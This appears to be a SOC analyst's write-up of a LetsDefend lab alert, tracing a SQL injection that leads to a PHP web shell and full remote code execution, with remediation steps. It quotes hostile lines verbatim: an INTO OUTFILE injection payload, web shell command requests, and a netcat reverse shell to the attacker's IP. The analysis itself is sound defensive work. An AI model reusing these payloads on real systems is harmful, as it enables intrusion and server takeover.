# 	SOC142 - Multiple HTTP 500 Response (Event ID:89)

## Executive Summary

On April 18, 2021, the Security Operations Center (SOC) received an alert for multiple HTTP 500 errors against the **SQLServer** (172.16.20.6). The investigation confirmed that these errors were the result of a successful, multi-stage attack by the external IP **101.32.223.119**. The attacker began with SQL injection probing, which generated the initial errors. They then successfully used a `SELECT ... INTO OUTFILE` SQL injection payload to write a PHP web shell (`cmd.php`) to the server. Following this, the attacker interacted with the web shell to execute commands and ultimately established a reverse shell using netcat, achieving full Remote Code Execution (RCE). The server is fully compromised. This is a **True Positive** for a critical security breach.

## Incident Details

The initial alert was triggered by the server's error responses to the attacker's SQL injection probes:

<img width="1474" height="498" alt="image" src="https://github.com/user-attachments/assets/1ce11879-a4d1-448a-b519-d8245d94bba9" />

| | |
| :--- | :--- |
| **Date of Incident**| April 18, 2021 |
| **Attacker IP**| 101.32.223.119 |
| **Destination Host**| SQLServer (172.16.20.6) |
| **Initial Vector**| SQL Injection |
| **Outcome**| Remote Code Execution (RCE) via Web Shell |
| **Case Link**| *([Case link](https://app.letsdefend.io/case-management/casedetail/sohankanna/89))* |

## Investigation and Analysis

### 1. Reconstructing the Attack Chain via Log Analysis

The web server logs provide a clear, step-by-step timeline of the attacker's successful compromise.

**Stage 1: SQL Injection Probing (The Noise)**
The attacker began by sending various malformed SQL injection payloads to test the application's response. These invalid queries caused the database to error out, resulting in the **HTTP 500** responses that triggered the initial alert.
<br>
<img width="771" height="291" alt="image" src="https://github.com/user-attachments/assets/66269063-4e8f-4ae7-9eb0-0e425d4c27ec" />

**Stage 2: Web Shell Upload (The Weapon)**
After identifying a vulnerability, the attacker used a specific SQL injection payload to write a file to the web server's disk.
*   **Request:** `...userNumber=' union select 1, '' into outfile '/var/www/html/cmd.php' #`
*   **Response:** **`200 OK`**
*   **Explanation:** This is the critical SQLi payload. The `SELECT ... INTO OUTFILE` command is a MySQL feature that allows the result of a query to be written to a new file. The attacker abused this to create a file named `cmd.php` in the web root directory. The content of this file was likely a simple PHP web shell. The successful **`200 OK`** response indicates this command worked.
 <br>   <img width="786" height="310" alt="image" src="https://github.com/user-attachments/assets/5bfedda1-ea73-42c8-ac32-873cc468cdd5" />

**Stage 3: Command Execution via Web Shell**
The attacker immediately began using their newly created web shell to run commands.
*   **Request:** `.../cmd.php?cmd=whoami`
*   **Response:** **`200 OK`**
*   **Explanation:** The attacker sent a GET request to their web shell and passed the `whoami` command via the `cmd` parameter. The `200 OK` response confirms the web shell executed the command and returned the output.
    <img width="852" height="271" alt="image" src="https://github.com/user-attachments/assets/4162cd41-39e6-409d-b1da-ffce93146e02" />
*   **Further Commands:** The attacker followed up with an `id` command, continuing their reconnaissance.
    <img width="836" height="299" alt="image" src="https://github.com/user-attachments/assets/b6301d73-24e6-463f-b81a-015899559b90" />

**Stage 4: Reverse Shell and Full RCE**
The attacker's final goal was to establish a stable, interactive shell.
*   **Request:** `.../cmd.php?cmd=nc 101.32.223.119 1234 -e /bin/sh`
*   **Explanation:** The attacker used the web shell to execute a `netcat` (`nc`) command. This command instructs the compromised server (`SQLServer`) to connect back to the attacker's IP (`101.32.223.119`) on port `1234` and to pipe a shell (`/bin/sh`) through that connection. This is a classic reverse shell, giving the attacker full, interactive RCE.
    <img width="784" height="315" alt="image" src="https://github.com/user-attachments/assets/14b0909a-4c4b-4bf0-a1d8-81eca4da8a68" />

### 2. Confirmation via Endpoint Logs

EDR logs provide the final, definitive proof of compromise.
*   **Endpoint Logs:** The logs show the `netcat` (`nc`) command being executed on the `SQLServer`. Most importantly, they show an outbound network connection from the server to the attacker's IP, `101.32.223.119`. This confirms the reverse shell was successfully established.
    <img width="1067" height="65" alt="image" src="https://github.com/user-attachments/assets/231da47e-bc3d-40ba-a879-61af27ba3b22" />
    <img width="1129" height="169" alt="image" src="https://github.com/user-attachments/assets/b6bc0350-090e-4994-a227-187915db3f5a" />

### 3. Threat Intelligence

The attacker's IP `101.32.223.119` is a known bad actor with over 600 reports on AbuseIPDB, confirming the hostile nature of the activity.

<img width="1505" height="729" alt="image" src="https://github.com/user-attachments/assets/85a6fc06-7a2b-4630-8caf-b5bf07521add" />

## Skills and Tools Utilized

*   **Tools Used:** SIEM, EDR, Web Server Logs, AbuseIPDB
*   **Skills Demonstrated:** SQL Injection Analysis, Web Shell Triage, RCE Analysis, Attack Chain Reconstruction, Log Correlation.

## Playbook Solution: Incident Classification

*   **Is Traffic Malicious?** **Yes.** It is a successful SQLi to RCE attack chain.
*   **What Is The Attack Type?** **SQL Injection** followed by **Remote Code Execution.**
*   **Was the Attack Successful?** **Yes.** The attacker successfully uploaded a web shell and established a reverse shell.
*   **Do You Need Tier 2 Escalation?** **Yes.** A full server compromise is a critical incident.
*   **Incident Classification:** **True Positive.**

## Conclusion and Recommendations

The alert for SOC142 was a **true positive** for a critical and successful attack. An attacker escalated from a SQL Injection vulnerability to full Remote Code Execution on the **SQLServer**. The host is fully compromised and under attacker control via a reverse shell.

**Recommendations:**

1.  **CONTAINMENT - Isolate Host Immediately:** Disconnect the **SQLServer** (172.16.20.6) from the network to terminate the attacker's reverse shell and prevent lateral movement.
2.  **ESCALATE:** Immediately escalate this incident to the Tier 2/Incident Response (IR) team and the application development team.
3.  **VULNERABILITY REMEDIATION:** The development team must patch the SQL Injection vulnerability in the `userNumber` parameter immediately. The use of parameterized queries or prepared statements is the standard fix. The `SELECT ... INTO OUTFILE` capability should also be reviewed and restricted.
4.  **ERADICATION:** The IR team must locate and remove the `cmd.php` web shell and hunt for any other persistence mechanisms the attacker may have established.
5.  **INVESTIGATION:** A full forensic analysis is required to determine all actions the attacker took after gaining RCE.
6.  **RECOVERY:** The server must be rebuilt from a known-good, trusted image after the application vulnerability has been patched.
7.  **BLOCK INDICATORS:** Block the attacker's IP address `101.32.223.119` at the network firewall.







